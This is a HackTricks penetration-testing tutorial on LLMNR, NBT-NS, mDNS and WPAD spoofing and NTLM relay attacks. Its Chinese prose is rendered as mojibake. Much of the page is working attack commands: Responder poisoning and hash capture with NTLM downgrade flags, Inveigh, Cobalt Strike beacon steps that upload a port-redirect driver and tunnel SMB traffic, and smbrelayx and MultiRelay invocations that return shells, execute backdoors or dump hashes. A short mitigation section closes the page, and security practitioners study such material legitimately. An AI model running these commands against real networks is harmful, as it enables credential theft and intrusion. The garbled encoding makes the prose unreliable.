# æ¬ºéª—LLMNRã€NBT-NSã€mDNS/DNSå’ŒWPADä»¥åŠä¸­ç»§æ”»å‡»

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç½‘ç»œåè®®

### LLMNRã€NBT-NSå’ŒmDNS

å½“DNSæŸ¥æ‰¾å¤±è´¥æ—¶ï¼ŒMicrosoftç³»ç»Ÿä½¿ç”¨é“¾è·¯æœ¬åœ°å¤šæ’­åç§°è§£æï¼ˆLLMNRï¼‰å’ŒNetBIOSåç§°æœåŠ¡ï¼ˆNBT-NSï¼‰è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚Apple Bonjourå’ŒLinuxé›¶é…ç½®å®ç°ä½¿ç”¨å¤šæ’­DNSï¼ˆmDNSï¼‰åœ¨ç½‘ç»œå†…å‘ç°ç³»ç»Ÿã€‚è¿™äº›åè®®æœªç»è®¤è¯ï¼Œå¹¶é€šè¿‡UDPå¹¿æ’­æ¶ˆæ¯ï¼›å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·å¼•å¯¼è‡³æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨Responderå†’å……ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€å‡å“åº”ã€‚\
åœ¨æ­¤é˜…è¯»æ›´å¤šå…³äº[å¦‚ä½•ä½¿ç”¨Responderå†’å……æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„ä¿¡æ¯ã€‚

### WPAD

è®¸å¤šæµè§ˆå™¨ä½¿ç”¨Webä»£ç†è‡ªåŠ¨å‘ç°ï¼ˆWPADï¼‰ä»ç½‘ç»œåŠ è½½ä»£ç†è®¾ç½®ã€‚WPADæœåŠ¡å™¨é€šè¿‡ç‰¹å®šURLï¼ˆä¾‹å¦‚ï¼Œ_http://wpad.example.org/wpad.dat_ï¼‰æä¾›å®¢æˆ·ç«¯ä»£ç†è®¾ç½®ï¼Œé€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼è¯†åˆ«ï¼š

* DHCPï¼Œä½¿ç”¨ä»£ç 252æ¡ç›®[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNSï¼Œæœç´¢æœ¬åœ°åŸŸä¸­çš„_wpad_ä¸»æœºå
* Microsoft LLMNRå’ŒNBT-NSï¼ˆåœ¨DNSæŸ¥æ‰¾å¤±è´¥çš„æƒ…å†µä¸‹ï¼‰

Responderè‡ªåŠ¨åŒ–WPADæ”»å‡»â€”è¿è¡Œä»£ç†å¹¶é€šè¿‡DHCPã€DNSã€LLMNRå’ŒNBT-NSå°†å®¢æˆ·ç«¯å¼•å¯¼è‡³æ¶æ„WPADæœåŠ¡å™¨ã€‚

## åè®®æŠ•æ¯’

### Responder - LLMNRã€NBT-NSå’ŒMDNS

> Responderæ˜¯LLMNRã€NBT-NSå’ŒMDNSæŠ•æ¯’å™¨ã€‚å®ƒå°†æ ¹æ®åç§°åç¼€ï¼ˆå‚è§ï¼š[http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409)ï¼‰å›åº”ç‰¹å®šçš„NBT-NSï¼ˆNetBIOSåç§°æœåŠ¡ï¼‰æŸ¥è¯¢ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å·¥å…·åªå›åº”æ–‡ä»¶æœåŠ¡å™¨æœåŠ¡è¯·æ±‚ï¼Œå³SMBã€‚
>
> å…¶èƒŒåçš„æ¦‚å¿µæ˜¯é’ˆå¯¹æˆ‘ä»¬çš„å›ç­”ï¼Œå¹¶åœ¨ç½‘ç»œä¸Šæ›´éšè”½ã€‚è¿™ä¹Ÿæœ‰åŠ©äºç¡®ä¿æˆ‘ä»¬ä¸ç ´ååˆæ³•çš„NBT-NSè¡Œä¸ºã€‚

* [**Responder**](https://github.com/lgandx/Responder) é»˜è®¤å®‰è£…åœ¨kaliä¸­ï¼Œé…ç½®æ–‡ä»¶ä½äº **`/etc/responder/Responder.conf`**ï¼ˆåœ¨è¿™é‡Œæ‚¨å¯ä»¥ç¦ç”¨æ¶æ„æœåŠ¡å™¨ï¼‰
* **Responder** å°†**åœ¨å±å¹•ä¸Šæ‰“å°å“ˆå¸Œå€¼**å¹¶å°†å…¶**å†™å…¥**ä½äº `/usr/share/responder/logs` ç›®å½•çš„æ¯ä¸ªä¸»æœºçš„**æ—¥å¿—**æ–‡ä»¶ä¸­ã€‚å“ˆå¸Œå€¼ä¿å­˜æ ¼å¼ä¸º `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`
* æ‚¨å¯ä»¥åœ¨æ­¤æ‰¾åˆ°é€‚ç”¨äº**windows**çš„Responder [è¿™é‡Œ](https://github.com/lgandx/Responder-Windows)
* Responderæ”¯æŒ**ipv4**å’Œ**ipv6**

#### Responder å‚æ•°

Responderæ”¯æŒä»¥ä¸‹é€‰é¡¹ï¼š
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>å“åº”è€…å‚æ•°</summary>

* `-A` æ ‡å¿—å°†æˆ‘ä»¬ç½®äº**åˆ†ææ¨¡å¼**ï¼Œå…è®¸æˆ‘ä»¬åœ¨ç¯å¢ƒä¸­çœ‹åˆ° NBT-NSã€BROWSER å’Œ LLMNR è¯·æ±‚ï¼Œè€Œä¸ä¼šæ±¡æŸ“ä»»ä½•å“åº”ã€‚
* æˆ‘ä»¬å¿…é¡»å§‹ç»ˆæä¾›ä¸€ä¸ªæ¥å£æˆ– IPã€‚
* `-wf` å°†å¯åŠ¨ WPAD æ¶æ„ä»£ç†æœåŠ¡å™¨
* `-f` å°†å°è¯•è¯†åˆ«è¿œç¨‹ä¸»æœºæ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬
* ä½¿ç”¨ `-v` æ ‡å¿—ä»¥å¢åŠ è¯¦ç»†ç¨‹åº¦ï¼ˆæ§åˆ¶å°æ‰“å°å¤§é‡é¢å¤–æ•°æ®ï¼‰
* è¯¸å¦‚ `-F` å’Œ `-P` ä¹‹ç±»çš„é€‰é¡¹å¯ä»¥ç”¨æ¥å¼ºåˆ¶ NTLM æˆ–åŸºæœ¬è®¤è¯å’Œå¼ºåˆ¶ä»£ç†è®¤è¯ï¼Œä½†å¯èƒ½ä¼šå¯¼è‡´ç™»å½•æç¤ºï¼Œå› æ­¤åº”è°¨æ…ä½¿ç”¨ã€‚
* `-w` æ ‡å¿—åˆ©ç”¨å†…ç½®çš„ WPAD ä»£ç†æœåŠ¡å™¨ã€‚è¿™å¯ä»¥éå¸¸æœ‰æ•ˆï¼Œç‰¹åˆ«æ˜¯åœ¨å¤§å‹ç»„ç»‡ä¸­ï¼Œå› ä¸ºå¦‚æœæµè§ˆå™¨å¯ç”¨äº†[è‡ªåŠ¨æ£€æµ‹è®¾ç½®](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11)ï¼Œå®ƒå°†æ•è·ä»»ä½•å¯åŠ¨ Internet Explorer çš„ç”¨æˆ·çš„æ‰€æœ‰ HTTP è¯·æ±‚ã€‚

</details>

#### è¿è¡Œå“åº”è€…

è¦è¿è¡Œé»˜è®¤çš„å“åº”è€…è¡Œä¸ºï¼Œä½ åªéœ€æ‰§è¡Œï¼š
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
ä¸€ä¸ªæœ‰è¶£çš„æŠ€æœ¯æ˜¯ä½¿ç”¨responderåœ¨å¯èƒ½çš„æƒ…å†µä¸‹é™çº§NTLMè®¤è¯ã€‚è¿™å°†å…è®¸**æ•è·NTLMv1æŒ‘æˆ˜å’Œå“åº”**ï¼Œè€Œä¸æ˜¯å¯ä»¥**è½»æ¾ç ´è§£**çš„NTLMv2ï¼Œå…·ä½“æ–¹æ³•å¯ä»¥å‚è€ƒ[**è¿™ä¸ªæŒ‡å—**](../../windows-hardening/ntlm/#ntlmv1-attack)**ã€‚**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
**é»˜è®¤æƒ…å†µä¸‹**ï¼Œ**WPADæ¨¡æ‹Ÿä¸ä¼šæ‰§è¡Œ**ï¼Œä½†ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹æ“ä½œæ¥æ‰§è¡Œå®ƒï¼š
```bash
responder -I <Iface> --wpad
```
ä½ ä¹Ÿå¯ä»¥ç”¨**ä½ çš„IP**æ¥**è§£æNetBIOS**è¯·æ±‚ã€‚å¹¶åˆ›å»ºä¸€ä¸ª**è®¤è¯ä»£ç†**ï¼š
```bash
responder.py -I <interface> -Pv
```
æ‚¨é€šå¸¸æ— æ³•æˆªè·NTLMå“ˆå¸Œå€¼ï¼Œä½†æ‚¨å¯ä»¥è½»æ¾æŠ“å–ä¸€äº›**NTLMæŒ‘æˆ˜å’Œå“åº”**ï¼Œç„¶åå¯ä»¥ä½¿ç”¨ä¾‹å¦‚_**john**_çš„é€‰é¡¹`--format=netntlmv2`è¿›è¡Œ**ç ´è§£**ã€‚

é»˜è®¤_**Responder**_å®‰è£…åœ¨kaliä¸­çš„**æ—¥å¿—å’ŒæŒ‘æˆ˜**å¯ä»¥åœ¨`/usr/share/responder/logs`æ‰¾åˆ°ã€‚

#### Responder - DHCPæŠ•æ¯’

Windowsä½¿ç”¨å‡ ä¸ªè‡ªå®šä¹‰çš„DHCPé€‰é¡¹ï¼Œå¦‚NetBIOSã€WINSã€WPADè®¾ç½®ã€‚å½“å·¥ä½œç«™å‘é€DHCPè¯·æ±‚ä»¥è·å–å…¶ç½‘ç»œè®¾ç½®æ—¶ï¼Œè¿™äº›é™„åŠ è®¾ç½®å¯ä»¥åŒ…å«åœ¨DHCPç­”å¤ä¸­ï¼Œä»¥ä¾¿ç®€åŒ–è¿æ¥å’Œåç§°è§£æã€‚

åœ¨ä¸ä¸­æ–­çš„æƒ…å†µä¸‹ä¼ªé€ DHCPå“åº”å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ï¼Œå› ä¸ºæ‚¨æ­£åœ¨å¹²æ‰°å·¥ä½œç«™çš„ç½‘ç»œé…ç½®ã€‚é€šå¸¸ï¼Œæ‚¨éœ€è¦éå¸¸äº†è§£ç›®æ ‡å­ç½‘ï¼ŒDNSæœåŠ¡å™¨åœ¨å“ªé‡Œï¼Œäº¤æ¢æœºåœ¨å“ªé‡Œï¼Œè·¯ç”±è¡¨ã€åŸŸã€å­ç½‘æ©ç ã€DHCPæœåŠ¡å™¨ç­‰åœ¨å“ªé‡Œã€‚**è¿™äº›è®¾ç½®çš„ä»»ä½•é”™è¯¯éƒ½ä¼šå¯¼è‡´ç½‘ç»œä¸­æ–­ã€‚**

ç„¶è€Œï¼Œä¼ªé€ DHCPç­”å¤å…·æœ‰ç‹¬ç‰¹çš„å¥½å¤„ã€‚**å®ƒç»å¯¹æ¯”ARPæŠ•æ¯’æ›´éšè”½**ï¼›ä¸€ä¸ªå•æ’­å“åº”å°±è¶³ä»¥æ°¸ä¹…æ€§åœ°æ±¡æŸ“å—å®³è€…çš„è·¯ç”±ä¿¡æ¯ï¼Œè€Œä¸”åœ¨ç½‘ç»œä¸Šè¿è¡Œå¤šä¸ªDHCPæœåŠ¡å™¨ä¹Ÿæ˜¯å¸¸è§çš„ã€‚å•æ’­DHCPç­”å¤æ›´éš¾ä»¥æ£€æµ‹ï¼Œå°‘æ•°äº¤æ¢æœºæä¾›å®‰å…¨è®¾ç½®ä»¥é˜²æ­¢DHCPçªƒå¬ï¼Œç„¶è€Œè¿™äº›è®¾ç½®å¹¶ä¸ç›´è§‚ï¼Œå½“å¯ç”¨æ—¶ç»å¸¸é…ç½®é”™è¯¯ã€‚

> è¿™ç§æ”»å‡»éå¸¸æœ‰æ•ˆï¼Œå¹¶ä¸”å¯ä»¥ç¡®ä¿æ‚¨è·å¾—NTLMv1/2å“ˆå¸Œå€¼ã€‚
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - æ•è·å‡­è¯

Responder å°†**å†’å……ä½¿ç”¨ä¸Šè¿°åè®®çš„æ‰€æœ‰æœåŠ¡**ã€‚ä¸€æ—¦æŸä¸ªç”¨æˆ·å°è¯•è®¿é—®é€šè¿‡è¿™äº›åè®®è§£æçš„æœåŠ¡ï¼Œ**ä»–å°†å°è¯•å¯¹ Responder è¿›è¡Œè®¤è¯**ï¼ŒResponder å°†èƒ½å¤Ÿ**æ•è·**â€œå‡­è¯â€ï¼ˆå¾ˆå¯èƒ½æ˜¯ä¸€ä¸ª**NTLMv2 æŒ‘æˆ˜/å“åº”**ï¼‰ï¼š

å¯ä»¥å°è¯•é™çº§åˆ° NetNTLMv1 æˆ–å°è¯•ç¦ç”¨ ESSã€‚

![](<../../.gitbook/assets/poison (1) (1) (1).jpg>)

### Inveigh - C#/PowerShell Responder

> Inveigh æ˜¯ä¸€ä¸ªä¸ºäº†å¸®åŠ©é™åˆ¶åœ¨ Windows ç³»ç»Ÿä¸Šçš„æ¸—é€æµ‹è¯•äººå‘˜/çº¢é˜Ÿæˆå‘˜è€Œè®¾è®¡çš„ PowerShell ADIDNS/LLMNR/NBNS/mDNS/DNS æ¬ºéª—å’Œä¸­é—´äººå·¥å…·ã€‚

[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) æœ€åˆæ˜¯ä¸€ä¸ª PowerShell è„šæœ¬ï¼Œç°åœ¨å®ƒæ˜¯ä¸€ä¸ª C# äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…·æœ‰ä¸ Responder ç›¸åŒçš„ä¸»è¦åŠŸèƒ½ã€‚æœ‰ä¸€ä¸ª [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) \*\*\*\* åˆ—å‡ºäº†æ‰€æœ‰å‚æ•°å’Œä½¿ç”¨è¯´æ˜ã€‚
å¦ä¸€ä¸ªç‰ˆæœ¬å¯ä»¥åœ¨ [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) ä¸­æ‰¾åˆ°ã€‚

![](../../.gitbook/assets/45662029-1b5e6300-bace-11e8-8180-32f8d377d48b.png)

æˆ–è€…ä½¿ç”¨æ›´å¤šé€‰é¡¹è¿è¡Œå®ƒï¼š
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
æˆ–è¿è¡ŒC#ç‰ˆæœ¬ï¼š
```bash
Inveigh.exe
```
## NTLM ä¸­ç»§æ”»å‡»

æ­¤æ”»å‡»åœ¨å†…éƒ¨ç½‘ç»œä¸Šä¸­ç»§ **SMB è®¤è¯ä¼šè¯** åˆ°ä¸€ä¸ª **ç›®æ ‡æœºå™¨**ã€‚å¦‚æœè®¤è¯ **ä¼šè¯æˆåŠŸ**ï¼Œå®ƒå°†è‡ªåŠ¨è®©ä½ è¿›å…¥ä¸€ä¸ª **ç³»ç»Ÿ** **shell**ã€‚è¯·æ³¨æ„ï¼Œè¢«ä¸­ç»§çš„è®¤è¯å¿…é¡»æ¥è‡ªä¸€ä¸ªå¯¹è¢«ä¸­ç»§ä¸»æœºæœ‰æœ¬åœ°ç®¡ç†å‘˜è®¿é—®æƒé™çš„ **ç”¨æˆ·**ï¼Œå¹¶ä¸” **SMB ç­¾åå¿…é¡»è¢«ç¦ç”¨**ã€‚

### 445 ç«¯å£è½¬å‘å’Œéš§é“

{% hint style="warning" %}
å¦‚æœä½ èƒ½å¤Ÿ **åœ¨ç½‘ç»œå†…å¼•å…¥ä¸€å°æœºå™¨**ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸‹ä¸€èŠ‚çš„ä»»ä½• **å·¥å…·** æ¥æ‰§è¡Œä¸­ç»§æ”»å‡»ï¼Œä½ å°±ä¸éœ€è¦å…³å¿ƒè¿™ä¸ªé—®é¢˜ã€‚
{% endhint %}

ç„¶è€Œï¼Œåœ¨çº¢é˜Ÿä¸­è¿™é€šå¸¸ä¸æ˜¯è¿™æ ·ï¼Œåœ¨çº¢é˜Ÿä¸­ä½ é€šå¸¸éœ€è¦å°† **Windowsæœºå™¨çš„445ç«¯å£çš„æµé‡è½¬å‘åˆ°ä½ çš„æœºå™¨** ä¸Šæ‰§è¡Œä»¥ä¸‹ä»»ä½•å·¥å…·ï¼Œç„¶åé€šè¿‡ä»£ç† **å°†è¯¥å·¥å…·çš„æµé‡è·¯ç”±å›å»**ï¼Œä»¥è¾¾åˆ°æ”»å‡»å†…éƒ¨ç½‘ç»œä¸­çš„æœºå™¨ã€‚

å·¥å…· [**PortBender**](https://github.com/praetorian-inc/PortBender) æ˜¯ä¸€ä¸ªé©±åŠ¨ç¨‹åºï¼Œç”¨äº **é‡å®šå‘** ç›®æ ‡ä¸ºç«¯å£ **445 çš„æµé‡åˆ°å¦ä¸€ä¸ªç«¯å£**ï¼ˆä¾‹å¦‚ 8445ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç»‘å®šè¿™ä¸ªç«¯å£ã€‚å®ƒ **éœ€è¦æœ¬åœ°ç®¡ç†å‘˜** æƒé™æ‰èƒ½åŠ è½½é©±åŠ¨ç¨‹åºã€‚ä½¿ç”¨ `cd C:\Windows\System32\drivers` æ˜¯æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºè¿™æ˜¯å¤§å¤šæ•°Windowsé©±åŠ¨ç¨‹åºæ‰€åœ¨çš„ä½ç½®ã€‚
```bash
Cobalt Strike -> Script Manager -> Load (Select from the filesystem PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Go to drivers dir
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Forward traffic to 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Send traffic to port 8445 to Team Server
beacon> socks 1080 # Socks proxy in port 1080 to attack host in the internal network from the Team Server

# To kill
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Metasploit
```bash
setg Proxies socks4:127.0.0.1:1080 # Use this if you need to route the traffic to reach the attacked ip
set SRVHOST <local_ip>
set SRVPORT 445
set SMBHOST <ip_to_auth_to>
run -j
```
### smbrelayx
```bash
python3 smbrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
# By default it will just dump hashes
# To execute a command use: -c "ipconfig"
# To execute a backdoor use: -e "/path/to/backdoor

# Attack through socks proxy
proxychains python3 ntlmrelayx.py -t smb://<ip_to_attack> -smb2support --no-http-server --no-wcf-server
```
### MultiRelay

å¦‚æœä½ æƒ³ä½¿ç”¨ **MultiRelay**ï¼Œè¯·å¯¼èˆªåˆ° _**/usr/share/responder/tools**_ å¹¶æ‰§è¡Œ MultiRelay (`-t <IP target> -u <User>`)ï¼š
```bash
python MultiRelay.py -t <IP target> -u ALL # If "ALL" then all users are relayed
# By default a shell is returned
python MultiRelay.py -t <IP target> -u ALL -c whoami #-c to execute command
python MultiRelay.py -t <IP target> -u ALL -d #-d to dump hashes

# Use proxychains if you need to route the traffic to reach the attacked ip
```
### å¼ºåˆ¶ NTLM ç™»å½•

åœ¨ Windows ä¸­ï¼Œæ‚¨**å¯èƒ½èƒ½å¤Ÿå¼ºåˆ¶æŸäº›ç‰¹æƒè´¦æˆ·å¯¹ä»»æ„æœºå™¨è¿›è¡Œè®¤è¯**ã€‚é˜…è¯»ä»¥ä¸‹é¡µé¢ä»¥äº†è§£å¦‚ä½•æ“ä½œï¼š

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## è§£å†³æ–¹æ¡ˆ

### ç¦ç”¨ LLMNR

è¦åœ¨æ‚¨çš„åŸŸä¸­ä¸º DNS å®¢æˆ·ç«¯ç¦ç”¨ LLMNRï¼Œè¯·æ‰“å¼€ gpedit.mscã€‚\
å¯¼èˆªè‡³ è®¡ç®—æœºé…ç½®->ç®¡ç†æ¨¡æ¿->ç½‘ç»œ->DNS å®¢æˆ·ç«¯ã€‚\
æ‰¾åˆ°â€œå…³é—­å¤šæ’­åç§°è§£æâ€é€‰é¡¹å¹¶ç‚¹å‡»â€œç­–ç•¥è®¾ç½®â€ï¼š

![](../../.gitbook/assets/1.jpg)

æ‰“å¼€æ–°çª—å£åï¼Œå¯ç”¨æ­¤é€‰é¡¹ï¼Œç‚¹å‡»åº”ç”¨å¹¶ç¡®å®šï¼š

![](../../.gitbook/assets/2.jpg)

### **ç¦ç”¨ NBT-NS**

ç¦ç”¨ NBT-NS çš„ä¸€ä¸ªé€‰é¡¹æ˜¯ä½¿ç”¨ DHCP èŒƒå›´é€‰é¡¹ã€‚

å¦‚æœä½¿ç”¨ Microsoft çš„ DHCP æœåŠ¡å™¨ï¼Œé€‰æ‹©æ‚¨æƒ³è¦ç¦ç”¨ NBT-NS çš„èŒƒå›´ã€‚å³é”®ç‚¹å‡»â€œèŒƒå›´é€‰é¡¹â€å¹¶ç‚¹å‡»â€œé…ç½®é€‰é¡¹â€ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘æƒ³è¦ç¦ç”¨ NBT-NS çš„ DHCP èŒƒå›´æ˜¯ 192.168.1.100ã€‚

![](../../.gitbook/assets/3.jpg)

åœ¨èŒƒå›´é€‰é¡¹çª—å£ä¸­ï¼Œå¯¼èˆªè‡³é«˜çº§æ ‡ç­¾é¡µï¼Œå°†ä¸‹æ‹‰çª—å£æ›´æ”¹ä¸ºâ€œMicrosoft Windows 2000 é€‰é¡¹â€ï¼š

![](../../.gitbook/assets/4.jpg)

ä»åˆ—è¡¨ä¸­é€‰æ‹©â€œ001 Microsoft ç¦ç”¨ Netbios é€‰é¡¹â€ï¼Œå°†å…¶å€¼æ›´æ”¹ä¸ºâ€œ0x2â€ï¼Œç‚¹å‡»åº”ç”¨ç„¶åç¡®å®šï¼š

![](../../.gitbook/assets/5.jpg)

### WPAD

ä¸ºäº†ç¼“è§£ WPAD æ”»å‡»ï¼Œæ‚¨å¯ä»¥åœ¨æ‚¨çš„ DNS åŒºåŸŸä¸­æ·»åŠ ä¸€ä¸ªâ€œwpadâ€çš„æ¡ç›®ã€‚è¯·æ³¨æ„ï¼ŒDNS æ¡ç›®ä¸éœ€è¦æŒ‡å‘æœ‰æ•ˆçš„ WPAD æœåŠ¡å™¨ã€‚åªè¦æŸ¥è¯¢å¾—åˆ°è§£æï¼Œæ”»å‡»å°±ä¼šè¢«é˜»æ­¢ã€‚

### å¤šé‡ä¸­ç»§

1\. **åœ¨æ‰€æœ‰æœ¬åœ° Windows æœºå™¨ä¸Šå¼ºåˆ¶ SMB ç­¾å**ã€‚æ­¤è®¾ç½®å°†å¯¹æ¯ä¸ª SMB ä¼šè¯è¿›è¡Œæ•°å­—ç­¾åï¼Œè¿™è¿«ä½¿å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ¨ç»§ç»­ä¹‹å‰éªŒè¯æ•°æ®åŒ…çš„æ¥æºã€‚æ­¤è®¾ç½®é»˜è®¤ä»…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šå¯ç”¨ã€‚ä»¥ä¸‹æ¥è‡ª Microsoft çš„æ–‡ç« è¯¦ç»†ä»‹ç»äº†è¿™äº›è®¾ç½®ï¼ˆå¯ä»¥é€šè¿‡ç»„ç­–ç•¥å¯ç”¨ï¼‰ï¼Œä»¥åŠå¦‚ä½•å®æ–½å®ƒä»¬ã€‚

[https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/](https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/)

[https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/microsoft-network-client-digitally-sign-communications-always)

2\. **å®¡æŸ¥å¹¶ç¡®ä¿æœ¬åœ°ç½‘ç»œä¸Šçš„ç”¨æˆ·åªèƒ½è¿œç¨‹ç™»å½•åˆ°å¿…è¦çš„æœºå™¨**ã€‚ä¾‹å¦‚ï¼šSally åªèƒ½ç™»å½•åˆ° Sally çš„å·¥ä½œç«™ã€‚å¦‚æœæ”»å‡»è€…æˆªè·äº† Sally çš„ SMB è®¤è¯ä¼šè¯ï¼Œä»–ä»¬å°±ä¸èƒ½å°†ä¼šè¯ä¸­ç»§åˆ°ä»»ä½•å·¥ä½œç«™ï¼Œä½¿è¿™ç§æ–¹æ³•æ— æ•ˆã€‚

3\. **å°½å¯èƒ½é™åˆ¶æœ¬åœ°ç½‘ç»œä¸Šçš„ NTLM è®¤è¯**ã€‚è¿™ç§æ”»å‡»æ— æ³•åˆ©ç”¨ Kerberos è®¤è¯ï¼Œå› æ­¤é€šè¿‡é™åˆ¶å‘ç”Ÿçš„ NTLM æ•°é‡ï¼Œå¯ä»¥å¤§å¤§é˜»ç¢è¿™ç§æ”»å‡»ã€‚Microsoft æä¾›äº†å®ç°è¿™ä¸€ç‚¹çš„ä¿¡æ¯ï¼Œä½†è¯·æ³¨æ„.. å¦‚æœ Kerberos è®¤è¯å‡ºäºä»»ä½•åŸå› å¤±è´¥ï¼Œå®ƒé€šå¸¸ä¼šå›é€€åˆ° NTLMã€‚å¦‚æœæ‚¨å®Œå…¨ç¦ç”¨å®ƒï¼Œæ‚¨çš„ç½‘ç»œå¯èƒ½ä¼šåœæ­¢è¿è¡Œã€‚

4\. **é˜²æ­¢æœªç»æˆæƒçš„ç”¨æˆ·è¿›å…¥æ‚¨çš„ç½‘ç»œ**ã€‚å†…éƒ¨å¨èƒè€…å¯èƒ½ä¸ä¼šä½¿ç”¨ SMB ä¸­ç»§æ”»å‡»ï¼Œå› ä¸ºä»–ä»¬å·²ç»æ‹¥æœ‰ç½‘ç»œå‡­æ®ã€‚é€šè¿‡åŠ å¼ºç‰©ç†å®‰å…¨æ”¿ç­–ï¼Œä½¿ç”¨ ACL å’Œ MAC è¿‡æ»¤é˜²æ­¢ç½‘ç»œä¸Šçš„æ¶æ„è®¾å¤‡ï¼Œå¹¶ç¡®ä¿é€‚å½“çš„ç½‘ç»œåˆ†æ®µï¼Œæ‚¨å¯ä»¥å¤§å¤§é™åˆ¶è¿™ç§æ”»å‡»è¢«æ‰§è¡Œçš„å¨èƒã€‚

## å‚è€ƒèµ„æ–™

